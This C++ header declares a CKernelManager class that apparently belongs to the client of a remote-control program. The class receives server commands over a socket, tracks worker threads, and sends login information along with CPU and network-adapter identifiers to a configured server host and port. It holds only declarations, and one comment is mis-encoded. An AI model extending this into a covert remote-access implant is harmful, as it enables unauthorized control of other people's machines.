// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////
#pragma once
#include "Manager.h"
#include <Iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#include <Lmaccess.h>
#include <LM.h>
#pragma comment(lib,"Netapi32.lib")
//#include "macros.h"

class CKernelManager : public CManager  
{
public:

	CKernelManager(CClientSocket *pClient,char* lpszServerHost, UINT nServerPort);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	bool	IsActived();

	static char m_ServerHost[260];
	static UINT	m_ServerPort;
	UINT	m_ID;
private:
	
	HANDLE	m_hThread[1000]; // ◊„πª”√¡À
	UINT	m_nThreadCount;
	bool	m_bIsActived;

public:
	UINT	GetCpuID();
	UINT	GetAdapterID();
	int		sendLoginInfo();
};